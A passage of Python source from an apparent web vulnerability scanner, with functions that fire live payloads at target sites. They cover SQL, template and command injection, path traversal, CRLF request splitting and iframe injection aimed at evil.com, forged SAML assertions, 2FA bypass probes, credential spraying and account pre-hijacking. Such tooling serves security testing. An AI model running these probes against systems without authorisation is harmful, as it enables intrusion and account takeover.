                            not any(x in body for x in ["invalid","incorrect","failed","wrong"])):
                        findings.append({
                            "type": f"Default Credentials: {user}:{pwd}",
                            "severity": "critical",
                            "url": url,
                            "detail": f"Login succeeded with {user}:{pwd}",
                            "template": "apex-password-spray",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_graphql_injection(crawl_data):
    """Injection via GraphQL variables — SQLi, SSTI, CMDi in variable values."""
    findings = []
    tested = set()
    injection_payloads = [
        ("' OR '1'='1", ["sql", "syntax", "mysql", "error"]),
        ("{{7*7}}", ["49"]),
        (";sleep 4", None),  # time-based CMDi
        ("../../../etc/passwd", ["root:", "daemon:"]),
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Get schema to find queries with string variables
                r = _S.post(url, json={"query": "{__schema{queryType{fields{name args{name type{name}}}}}}"},
                           headers={"Content-Type": "application/json"}, timeout=5)
                if r.status_code != 200: continue
                schema = json.loads(r.text)
                fields = (schema.get("data", {}).get("__schema", {})
                         .get("queryType", {}) or {}).get("fields", []) or []
                for field in fields[:5]:
                    fname = field.get("name", "")
                    str_args = [a["name"] for a in field.get("args", [])
                               if a.get("type", {}).get("name") in ("String", "ID")]
                    if not str_args: continue
                    for payload, markers in injection_payloads[:2]:
                        args_str = ", ".join(f'{a}: "{payload}"' for a in str_args[:2])
                        query = f'{{ {fname}({args_str}) {{ id }} }}'
                        try:
                            r2 = _S.post(url, json={"query": query},
                                        headers={"Content-Type": "application/json"}, timeout=8)
                            body = r2.text.lower()
                            if markers and any(m.lower() in body for m in markers):
                                findings.append({
                                    "type": f"GraphQL Variable Injection in {fname}",
                                    "severity": "critical",
                                    "url": url,
                                    "detail": f"Injection via {fname}({str_args[0]}): {payload[:40]}",
                                    "template": "apex-gql-inject",
                                })
                                break
                        except Exception:
                            continue
            except Exception:
                continue
    return findings


def scan_broken_function_level_auth(crawl_data, web_targets):
    """Test access to admin/privileged functions without admin role."""
    findings = []
    # Admin function paths that regular users shouldn't access
    admin_functions = [
        "/api/admin/users", "/api/admin/config", "/api/admin/logs",
        "/api/admin/delete", "/api/admin/reset", "/api/admin/export",
        "/api/v1/admin", "/api/v1/admin/users", "/api/v1/admin/settings",
        "/api/users/all", "/api/users/export", "/api/users/delete",
        "/api/config/update", "/api/settings/update", "/api/system/info",
        "/admin/api/users", "/admin/api/config", "/admin/api/export",
        "/management/users", "/management/config", "/internal/api",
        "/api/v1/users?role=admin", "/api/users?admin=true",
    ]
    for target in web_targets[:3]:
        try:
            r404 = _S.get(f"{target}/nonexistent_apex_xyz", timeout=3)
            size_404 = len(r404.content)
        except Exception:
            continue
        for path in admin_functions:
            try:
                r = _S.get(f"{target}{path}", timeout=5)
                if (r.status_code == 200 and
                        abs(len(r.content) - size_404) > 100):
                    try:
                        data = r.json()
                        if isinstance(data, (list, dict)) and len(str(data)) > 50:
                            has_sensitive = any(k in str(data).lower()
                                               for k in ["email","password","token","secret","admin","role"])
                            sev = "critical" if has_sensitive else "high"
                            findings.append({
                                "type": f"Broken Function Level Auth: {path}",
                                "severity": sev,
                                "url": f"{target}{path}",
                                "detail": f"Admin function accessible without auth ({len(r.content)}b)",
                                "template": "apex-bfla",
                            })
                    except Exception:
                        if len(r.content) > 200:
                            findings.append({
                                "type": f"Broken Function Level Auth: {path}",
                                "severity": "high",
                                "url": f"{target}{path}",
                                "detail": f"Admin path returns 200 ({len(r.content)}b)",
                                "template": "apex-bfla",
                            })
            except Exception:
                continue
    return findings


def scan_mass_user_enumeration(crawl_data, web_targets):
    """Enumerate users via API pagination — /api/users?page=1&limit=100."""
    findings = []
    user_endpoints = [
        "/api/users", "/api/v1/users", "/api/v2/users",
        "/api/accounts", "/api/members", "/api/customers",
        "/api/admin/users", "/users", "/api/user/list",
    ]
    for target in web_targets[:3]:
        for path in user_endpoints:
            for params in ["?limit=100", "?per_page=100", "?size=100", "?count=100", ""]:
                url = f"{target}{path}{params}"
                try:
                    r = _S.get(url, timeout=5)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            items = (data if isinstance(data, list) else
                                    data.get("users", data.get("data", data.get("items", data.get("results", [])))))
                            if isinstance(items, list) and len(items) >= 5:
                                emails = [str(u.get("email","")) for u in items if isinstance(u, dict) and u.get("email")]
                                has_emails = len(emails) > 0
                                sev = "critical" if has_emails else "high"
                                findings.append({
                                    "type": "Mass User Enumeration",
                                    "severity": sev,
                                    "url": url,
                                    "detail": f"Returns {len(items)} users without auth" +
                                             (f" including emails: {emails[0][:30]}..." if emails else ""),
                                    "template": "apex-user-enum",
                                })
                                break
                        except Exception:
                            pass
                except Exception:
                    continue
    return findings


def scan_cors_vary_origin(crawl_data):
    """CORS misconfiguration with Vary: Origin — indicates dynamic origin reflection."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            # Request without Origin
            r_no_origin = _S.get(page["url"], timeout=5)
            # Request with evil origin
            r_evil = _S.get(page["url"], timeout=5, headers={"Origin": "https://evil.com"})
            vary = r_evil.headers.get("Vary", "")
            acao = r_evil.headers.get("Access-Control-Allow-Origin", "")
            acac = r_evil.headers.get("Access-Control-Allow-Credentials", "")
            # Vary: Origin means the server reflects the origin dynamically
            if "origin" in vary.lower() and acao:
                if acao == "https://evil.com":
                    sev = "critical" if acac.lower() == "true" else "high"
                    findings.append({
                        "type": "CORS Dynamic Origin Reflection (Vary: Origin)",
                        "severity": sev,
                        "url": page["url"],
                        "detail": f"Vary: Origin + ACAO reflects evil.com, credentials={acac}",
                        "template": "apex-cors-vary",
                    })
                elif acao and acao != "*":
                    findings.append({
                        "type": "CORS with Vary: Origin Header",
                        "severity": "medium",
                        "url": page["url"],
                        "detail": f"Vary: Origin present — CORS policy may be bypassable",
                        "template": "apex-cors-vary",
                    })
        except Exception:
            pass
    return findings


def scan_insecure_jwt_storage(crawl_data):
    """Detect JWT stored in localStorage — vulnerable to XSS theft."""
    findings = []
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Check for localStorage JWT storage patterns in JS
            storage_patterns = [
                r'localStorage\.setItem\s*\(\s*["\'][^"\']*token[^"\']*["\']',
                r'localStorage\.setItem\s*\(\s*["\'][^"\']*jwt[^"\']*["\']',
                r'localStorage\.setItem\s*\(\s*["\'][^"\']*auth[^"\']*["\']',
                r'sessionStorage\.setItem\s*\(\s*["\'][^"\']*token[^"\']*["\']',
            ]
            for pattern in storage_patterns:
                if re.search(pattern, r.text, re.IGNORECASE):
                    findings.append({
                        "type": "JWT/Token Stored in localStorage",
                        "severity": "medium",
                        "url": page["url"],
                        "detail": "Token stored in localStorage — vulnerable to XSS theft. Use HttpOnly cookies instead.",
                        "template": "apex-jwt-storage",
                    })
                    break
            # Check for JWT in page source (already authenticated response)
            jwts = jwt_re.findall(r.text)
            if jwts:
                import base64 as _b64, json as _j
                for jwt in jwts[:2]:
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        payload = json.loads(_b64.urlsafe_b64decode(pad(jwt.split(".")[1])))
                        if any(k in payload for k in ["sub", "user_id", "email", "role", "admin"]):
                            findings.append({
                                "type": "JWT Exposed in Page Source",
                                "severity": "high",
                                "url": page["url"],
                                "detail": f"JWT with claims {list(payload.keys())} found in page source",
                                "template": "apex-jwt-storage",
                            })
                    except Exception:
                        pass
        except Exception:
            pass
    return findings


def scan_2fa_bypass_response(crawl_data):
    """2FA bypass via response manipulation — change false to true in auth response."""
    findings = []
    for page in crawl_data.get("pages", []):
        url = page["url"].lower()
        if not any(x in url for x in ["2fa", "otp", "mfa", "verify", "totp", "code"]): continue
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/api/2fa/verify", "/api/otp/verify", "/api/mfa/verify",
                     "/api/auth/2fa", "/2fa/verify", "/verify-otp"]:
            endpoint = f"{base}{path}"
            # Test with wrong OTP — check if response has manipulable boolean
            for otp in ["000000", "123456", "999999"]:
                try:
                    r = _S.post(endpoint, json={"code": otp, "otp": otp, "token": otp}, timeout=5)
                    body = r.text
                    # Look for false/fail in response that could be manipulated
                    if r.status_code in (200, 401) and any(x in body for x in
                            ['"success":false', '"verified":false', '"valid":false',
                             '"authenticated":false', '"status":"fail"', '"result":"error"']):
                        findings.append({
                            "type": "2FA Bypass via Response Manipulation",
                            "severity": "critical",
                            "url": endpoint,
                            "detail": "2FA response contains manipulable boolean — intercept and change false→true to bypass",
                            "template": "apex-2fa-bypass",
                        })
                        break
                    # Test empty/null OTP
                    r2 = _S.post(endpoint, json={"code": "", "otp": None, "token": "null"}, timeout=5)
                    if r2.status_code == 200 and "success" in r2.text.lower():
                        findings.append({
                            "type": "2FA Bypass: Empty/Null OTP Accepted",
                            "severity": "critical",
                            "url": endpoint,
                            "detail": "Empty or null OTP accepted — 2FA completely bypassed",
                            "template": "apex-2fa-bypass",
                        })
                        break
                except Exception:
                    continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 16 — FINAL: Everything remaining that's automatable
# Insecure deserialization gadgets, HTTP/2 push abuse, DNS rebinding,
# SSRF via DNS, blind NoSQL, XS-Leaks, CSWSH, iframe injection,
# HTTP splitting, open redirect chains, API key in headers,
# subdomain takeover via A record, timing attacks, cache deception v2,
# GraphQL subscription abuse, IDOR via GraphQL, JWT confusion attacks,
# SAML response replay, OAuth token fixation, account pre-hijacking
# ---------------------------------------------------------------------------

def scan_account_prehijacking(crawl_data):
    """Account pre-hijacking — register email before victim, then take over when they sign up."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["register","signup","join","create"]): continue
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/register", "/signup", "/api/register", "/api/signup", "/api/v1/register"]:
            url = f"{base}{path}"
            # Test 1: Register with unverified email, then try to use account
            try:
                import time as _t
                uid = int(_t.time()) % 100000
                email = f"prehijack_{uid}@test.com"
                r = _S.post(url, json={"email": email, "password": "Test1234!",
                                       "username": f"prehijack_{uid}"}, timeout=5)
                if r.status_code in (200, 201):
                    # Try to login immediately (before email verification)
                    for login_path in ["/login", "/api/login", "/signin"]:
                        r2 = _S.post(f"{base}{login_path}",
                                    json={"email": email, "password": "Test1234!"}, timeout=5)
                        if r2.status_code == 200 and "token" in r2.text.lower():
                            findings.append({
                                "type": "Account Pre-Hijacking (No Email Verification)",
                                "severity": "high",
                                "url": url,
                                "detail": "Can register and login without email verification — pre-hijacking possible",
                                "template": "apex-prehijack",
                            })
                            break
            except Exception:
                continue
            # Test 2: Register with OAuth provider email without verification
            try:
                r = _S.post(url, json={"email": "victim@gmail.com", "password": "Test1234!",
                                       "provider": "google", "oauth_token": "fake"}, timeout=5)
                if r.status_code in (200, 201):
                    findings.append({
                        "type": "Account Pre-Hijacking via OAuth Email",
                        "severity": "critical",
                        "url": url,
                        "detail": "Can register with OAuth provider email — when victim signs in via OAuth, attacker controls account",
                        "template": "apex-prehijack",
                    })
            except Exception:
                continue
    return findings


def scan_http_request_splitting(crawl_data):
    """HTTP request splitting via header injection — inject complete HTTP requests."""
    findings = []
    # Payloads that inject a second HTTP request
    splitting_payloads = [
        "test\r\nGET /evil HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        "test%0d%0aGET%20/evil%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0a",
        "test\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com",
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in splitting_payloads[:1]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5, allow_redirects=False)
                    # Check if injected headers appear in response
                    if "evil.com" in str(r.headers) or r.status_code in (400, 500):
                        if "evil" in r.headers.get("Host", ""):
                            findings.append({
                                "type": "HTTP Request Splitting",
                                "severity": "critical",
                                "url": test_url,
                                "detail": f"CRLF injection in param '{p}' splits HTTP request",
                                "template": "apex-http-split",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_xs_leaks(crawl_data):
    """XS-Leaks — cross-site information leakage via timing, error, frame counting."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Test 1: Error-based XS-Leak — different errors for valid/invalid resources
        for path in ["/api/users/1", "/api/user/1", "/api/profile/1"]:
            try:
                r_valid = _S.get(f"{base}{path}", timeout=5)
                r_invalid = _S.get(f"{base}{path.replace('/1', '/99999999')}", timeout=5)
                if r_valid.status_code != r_invalid.status_code:
                    findings.append({
                        "type": "XS-Leak: Status Code Oracle",
                        "severity": "medium",
                        "url": f"{base}{path}",
                        "detail": f"Different status codes for valid ({r_valid.status_code}) vs invalid ({r_invalid.status_code}) IDs — cross-site leak possible",
                        "template": "apex-xs-leak",
                    })
            except Exception:
                pass
        # Test 2: Frame counting — page embeddable and content differs based on auth state
        try:
            r = _S.get(page["url"], timeout=5)
            xfo = r.headers.get("X-Frame-Options", "")
            csp = r.headers.get("Content-Security-Policy", "")
            if not xfo and "frame-ancestors" not in csp:
                # Count iframes/frames in response
                frame_count = r.text.lower().count("<iframe") + r.text.lower().count("<frame")
                if frame_count > 0:
                    findings.append({
                        "type": "XS-Leak: Frameable Page with Dynamic Content",
                        "severity": "medium",
                        "url": page["url"],
                        "detail": f"Page embeddable in iframe with {frame_count} sub-frames — frame counting attack possible",
                        "template": "apex-xs-leak",
                    })
        except Exception:
            pass
    return findings


def scan_oauth_token_fixation(crawl_data):
    """OAuth token fixation — attacker pre-sets state parameter to known value."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                     "/connect/authorize", "/login/oauth"]:
            url = f"{base}{path}"
            try:
                # Test with fixed state value
                fixed_state = "apex_fixed_state_12345"
                r = _S.get(f"{url}?client_id=test&response_type=code"
                          f"&redirect_uri=https://example.com&state={fixed_state}",
                          timeout=5, allow_redirects=False)
                loc = r.headers.get("Location", "")
                # If state is preserved in redirect, fixation may be possible
                if fixed_state in loc and r.status_code in (302, 301):
                    findings.append({
                        "type": "OAuth State Fixation",
                        "severity": "high",
                        "url": url,
                        "detail": f"Fixed state '{fixed_state}' preserved in redirect — CSRF via state fixation",
                        "template": "apex-oauth-fixation",
                    })
                # Test: state not validated (any state accepted)
                r2 = _S.get(f"{url}?client_id=test&response_type=code"
                           f"&redirect_uri=https://example.com&state=",
                           timeout=5, allow_redirects=False)
                if r2.status_code in (200, 302) and "error" not in r2.text.lower():
                    findings.append({
                        "type": "OAuth Empty State Accepted",
                        "severity": "medium",
                        "url": url,
                        "detail": "Empty state parameter accepted — CSRF protection may be bypassable",
                        "template": "apex-oauth-fixation",
                    })
            except Exception:
                continue
    return findings


def scan_api_key_in_headers(crawl_data):
    """Detect API keys/tokens in response headers — leaked via X-API-Key, X-Token etc."""
    findings = []
    sensitive_headers = [
        "X-API-Key", "X-Api-Key", "X-Token", "X-Auth-Token", "X-Access-Token",
        "X-Secret", "X-Secret-Key", "X-App-Key", "X-Application-Key",
        "Authorization", "X-Session-Token", "X-CSRF-Token",
        "X-Internal-Token", "X-Service-Token", "X-Backend-Token",
    ]
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            for header in sensitive_headers:
                val = r.headers.get(header, "")
                if val and len(val) >= 16 and val.lower() not in ("true", "false", "null", "none"):
                    findings.append({
                        "type": f"Sensitive Token in Response Header: {header}",
                        "severity": "high",
                        "url": page["url"],
                        "detail": f"{header}: {val[:20]}... — credential exposed in response header",
                        "template": "apex-header-token",
                    })
        except Exception:
            pass
    return findings


def scan_idor_graphql(crawl_data):
    """IDOR via GraphQL queries — access other users' data by changing ID in query."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Try common user/profile queries with different IDs
                for query_template in [
                    'query {{ user(id: "{id}") {{ id email name role }} }}',
                    'query {{ profile(userId: "{id}") {{ id email phone address }} }}',
                    'query {{ account(id: "{id}") {{ id balance creditLimit }} }}',
                    'query {{ order(id: "{id}") {{ id total items user {{ email }} }} }}',
                ]:
                    responses = {}
                    for test_id in ["1", "2", "3", "100"]:
                        query = query_template.format(id=test_id)
                        try:
                            r = _S.post(url, json={"query": query},
                                       headers={"Content-Type": "application/json"}, timeout=5)
                            if r.status_code == 200 and "errors" not in r.text:
                                data = json.loads(r.text).get("data", {})
                                if data and str(data) != "{}":
                                    responses[test_id] = str(data)[:100]
                        except Exception:
                            pass
                    if len(set(responses.values())) > 1:
                        findings.append({
                            "type": "IDOR via GraphQL Query",
                            "severity": "critical",
                            "url": url,
                            "detail": f"Different data returned for IDs {list(responses.keys())} — IDOR in GraphQL",
                            "template": "apex-idor-gql",
                        })
                        break
            except Exception:
                continue
    return findings


def scan_subdomain_a_record_takeover(subdomains):
    """Subdomain takeover via dangling A record pointing to unclaimed cloud IP."""
    import socket as _sock
    findings = []
    # Cloud IP ranges that can be claimed
    cloud_ranges = {
        "AWS": ["52.", "54.", "34.", "35.", "18.", "3."],
        "Azure": ["40.", "13.", "20.", "104.", "137.", "138."],
        "GCP": ["34.", "35.", "104.", "130.", "142.", "146."],
        "DigitalOcean": ["104.", "138.", "159.", "165.", "167."],
        "Linode": ["45.", "66.", "96.", "139.", "172.", "173."],
    }
    for sub in subdomains[:50]:
        try:
            ips = _sock.getaddrinfo(sub, None, _sock.AF_INET)
            if not ips: continue
            ip = ips[0][4][0]
            # Check if IP is in a cloud range
            for provider, prefixes in cloud_ranges.items():
                if any(ip.startswith(p) for p in prefixes):
                    # Verify the host actually responds
                    try:
                        r = requests.get(f"https://{sub}", timeout=3, verify=False)
                        # Check for cloud "not found" pages
                        not_found_sigs = [
                            "NoSuchBucket", "404 Not Found", "The specified bucket",
                            "InvalidBucketName", "This site can't be reached",
                            "ERR_NAME_NOT_RESOLVED",
                        ]
                        if any(sig in r.text for sig in not_found_sigs):
                            findings.append({
                                "type": f"Potential A Record Takeover ({provider})",
                                "severity": "high",
                                "url": f"https://{sub}",
                                "detail": f"A record points to {provider} IP {ip} but resource not found",
                                "template": "apex-a-takeover",
                            })
                    except Exception:
                        pass
                    break
        except Exception:
            continue
    return findings


def scan_insecure_deserialization_patterns(crawl_data):
    """Detect insecure deserialization patterns — Java, PHP, Python pickle, Ruby Marshal."""
    findings = []
    # Serialized object signatures
    deser_sigs = {
        "Java": [b"\xac\xed\x00\x05", b"rO0AB"],  # Java serialized, base64
        "PHP": [b"O:", b"a:", b"s:", b"i:"],  # PHP serialize()
        "Python Pickle": [b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05"],
        "Ruby Marshal": [b"\x04\x08"],
        ".NET": [b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"],
    }
    import base64 as _b64
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Check cookies
            for name, val in r.cookies.items():
                for lang, sigs in deser_sigs.items():
                    # Check raw value
                    val_bytes = val.encode("latin-1", errors="replace")
                    if any(val_bytes.startswith(sig) for sig in sigs):
                        findings.append({
                            "type": f"Insecure Deserialization: {lang} Object in Cookie",
                            "severity": "critical",
                            "url": page["url"],
                            "detail": f"Cookie '{name}' contains {lang} serialized object",
                            "template": "apex-deser-pattern",
                        })
                    # Check base64 decoded
                    try:
                        decoded = _b64.b64decode(val + "==")
                        if any(decoded.startswith(sig) for sig in sigs):
                            findings.append({
                                "type": f"Insecure Deserialization: {lang} Object in Cookie (base64)",
                                "severity": "critical",
                                "url": page["url"],
                                "detail": f"Cookie '{name}' contains base64-encoded {lang} serialized object",
                                "template": "apex-deser-pattern",
                            })
                    except Exception:
                        pass
            # Check response body for serialized objects
            body_bytes = r.content
            for lang, sigs in deser_sigs.items():
                if any(sig in body_bytes for sig in sigs):
                    findings.append({
                        "type": f"Insecure Deserialization: {lang} Object in Response",
                        "severity": "high",
                        "url": page["url"],
                        "detail": f"Response contains {lang} serialized object",
                        "template": "apex-deser-pattern",
                    })
                    break
        except Exception:
            pass
    return findings


def scan_http2_push_abuse(web_targets):
    """HTTP/2 server push abuse — server pushes sensitive resources to attacker."""
    findings = []
    try:
        import httpx as _hx
    except ImportError:
        return findings
    for target in web_targets[:3]:
        if not target.startswith("https"): continue
        try:
            pushed = []
            with _hx.Client(http2=True, verify=False, timeout=10) as client:
                r = client.get(target)
                if r.http_version != "HTTP/2": continue
                # Check for Link: rel=preload headers (server push hints)
                link = r.headers.get("Link", "")
                if "preload" in link:
                    # Extract pushed resources
                    import re as _re
                    resources = _re.findall(r'<([^>]+)>;\s*rel=preload', link)
                    for res in resources:
                        if any(x in res.lower() for x in ["token", "auth", "secret", "key", "config"]):
                            pushed.append(res)
                    if pushed:
                        findings.append({
                            "type": "HTTP/2 Server Push of Sensitive Resources",
                            "severity": "medium",
                            "url": target,
                            "detail": f"Server pushes potentially sensitive resources: {', '.join(pushed[:3])}",
                            "template": "apex-h2-push",
                        })
        except Exception:
            continue
    return findings


def scan_saml_replay(crawl_data):
    """SAML response replay — reuse old SAML assertions."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/saml/acs", "/saml/consume", "/auth/saml/callback",
                     "/sso/saml", "/api/saml/callback"]:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=5)
                if r.status_code not in (200, 405, 400): continue
                # Try replaying an old/fake SAML response
                import base64 as _b64
                fake_saml = _b64.b64encode(b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    ID="_replay_test" Version="2.0">
                  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
                    <saml:Subject><saml:NameID>admin@test.com</saml:NameID></saml:Subject>
                  </saml:Assertion>
                </samlp:Response>""").decode()
                r2 = _S.post(url, data={"SAMLResponse": fake_saml}, timeout=5)
                if r2.status_code in (200, 302):
                    loc = r2.headers.get("Location", "")
                    if "error" not in r2.text.lower() and "invalid" not in r2.text.lower():
                        findings.append({
                            "type": "SAML Response Replay/Forgery",
                            "severity": "critical",
                            "url": url,
                            "detail": "SAML ACS endpoint accepts unsigned/forged assertions",
                            "template": "apex-saml-replay",
                        })
            except Exception:
                continue
    return findings


def scan_iframe_injection(crawl_data):
    """Iframe injection — inject iframes to load attacker content."""
    findings = []
    payload = '<iframe src="https://evil.com" width="100%" height="100%"></iframe>'
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if not any(x in p.lower() for x in ["html", "content", "body", "text",
                                                   "message", "description", "comment",
                                                   "template", "page", "embed"]):
                continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                if '<iframe src="https://evil.com"' in r.text:
                    findings.append({
                        "type": "Iframe Injection",
                        "severity": "high",
                        "url": test_url,
                        "detail": f"Param '{p}' injects iframe — content injection/phishing possible",
                        "template": "apex-iframe-inject",
                    })
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 17 — New scanners v9.0
# ---------------------------------------------------------------------------

def scan_csti_angular(crawl_data):
    """Client-Side Template Injection via Angular/Vue expressions."""
    findings = []
    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("{{constructor.constructor('return 1')()}}", "1"),
        ("[[$on.constructor('return 1')()]]", "1"),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, expected in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if expected in r.text and payload not in r.text:
                        findings.append({
                            "type": "Client-Side Template Injection (Angular/Vue)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Param '{p}' evaluates template expression: {payload} → {expected}",
                            "template": "apex-csti-angular",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_server_prototype_pollution(crawl_data, web_targets):
    """Server-Side Prototype Pollution via JSON body __proto__ injection."""
    findings = []
    tested = set()
    # Test JSON endpoints
    for url, params in crawl_data.get("params", {}).items():
        base = "/".join(url.split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
    # Also test known API patterns
    for target in web_targets[:10]:
        base = target.rstrip("/")
        endpoints = [
            f"{base}/api/user/settings",
            f"{base}/api/profile",
            f"{base}/api/config",
        ]
        for ep in endpoints:
            for payload_key in ["__proto__", "constructor.prototype"]:
                try:
                    body = {payload_key: {"polluted": "apex-test-pp"}}
                    r = _S.post(ep, json=body, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 204):
                        # Verify pollution by requesting the same endpoint
                        r2 = _S.get(ep, timeout=_TIMEOUT)
                        if "apex-test-pp" in r2.text or "polluted" in r2.text:
                            findings.append({
                                "type": "Server-Side Prototype Pollution",
                                "severity": "critical",
                                "url": ep,
                                "detail": f"JSON {payload_key} injection persists on server — RCE possible",
                                "template": "apex-sspp",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_http3_quic_probe(web_targets):
    """Probe for HTTP/3 QUIC support and test for misconfigurations."""
    findings = []
    for target in web_targets[:15]:
        try:
            r = _S.get(target, timeout=_TIMEOUT)
            alt_svc = r.headers.get("Alt-Svc", "")
            if "h3" in alt_svc or "quic" in alt_svc:
                # HTTP/3 is advertised — check for version downgrade issues
                # Try requesting with HTTP/1.1 only to see if security headers differ
                r2 = _S.get(target, headers={"Connection": "close"}, timeout=_TIMEOUT)
                h3_headers = set(r.headers.keys())
                h1_headers = set(r2.headers.keys())
                missing_in_h1 = [h for h in ["Strict-Transport-Security",
                                              "Content-Security-Policy",
                                              "X-Frame-Options"]
                                 if h in h3_headers and h not in h1_headers]
                if missing_in_h1:
                    findings.append({
                        "type": "HTTP/3 Security Header Inconsistency",
                        "severity": "medium",
                        "url": target,
                        "detail": f"Alt-Svc: {alt_svc[:60]}. Headers missing on fallback: {', '.join(missing_in_h1)}",
                        "template": "apex-h3-inconsistency",
                    })
                else:
                    findings.append({
                        "type": "HTTP/3 QUIC Supported",
                        "severity": "info",
                        "url": target,
                        "detail": f"Alt-Svc: {alt_svc[:80]}",
                        "template": "apex-h3-info",
                    })
        except Exception:
            continue
    return findings


def scan_graphql_subscription_abuse(crawl_data):
    """GraphQL subscription abuse — WebSocket DoS and data exfil via subscriptions."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql", "/query"]:
            ws_url = f"{base}{path}"
            try:
                # Check if subscriptions are enabled via introspection
                query = {"query": "{ __schema { subscriptionType { name fields { name } } } }"}
                r = _S.post(ws_url, json=query, timeout=_TIMEOUT)
                if r.status_code != 200:
                    continue
                data = r.json()
                sub_type = (data.get("data", {}).get("__schema", {})
                            .get("subscriptionType"))
                if sub_type and sub_type.get("fields"):
                    field_names = [f["name"] for f in sub_type["fields"]]
                    # Test if subscriptions are accessible without auth
                    for field in field_names[:3]:
                        sub_query = {"query": f"subscription {{ {field} {{ id }} }}"}
                        r2 = _S.post(ws_url, json=sub_query, timeout=_TIMEOUT)
                        if r2.status_code == 200 and "error" not in r2.text.lower():
                            findings.append({
                                "type": "GraphQL Subscription Abuse",
                                "severity": "high",
                                "url": ws_url,
                                "detail": f"Unauthenticated subscriptions: {', '.join(field_names[:5])}. Real-time data exfil possible.",
                                "template": "apex-graphql-subscription",
                            })
                            break
            except Exception:
                continue
    return findings


def scan_graphql_batching_rate_bypass(crawl_data):
    """API rate limit bypass via GraphQL query batching."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Send a single query first to establish baseline
                single = {"query": "{ __typename }"}
                r1 = _S.post(url, json=single, timeout=_TIMEOUT)
                if r1.status_code != 200:
                    continue
                # Now send a batch of 50 identical queries
                batch = [{"query": "{ __typename }"}] * 50
                r2 = _S.post(url, json=batch, timeout=_TIMEOUT)
                if r2.status_code == 200:
                    try:
                        resp = r2.json()
                        if isinstance(resp, list) and len(resp) >= 50:
                            findings.append({
                                "type": "Rate Limit Bypass via GraphQL Batching",
                                "severity": "high",
                                "url": url,
                                "detail": "GraphQL accepts batched queries (50+) in single request — bypasses per-request rate limiting",
                                "template": "apex-graphql-batch-ratelimit",
                            })
                    except Exception:
                        pass
            except Exception:
                continue
    return findings


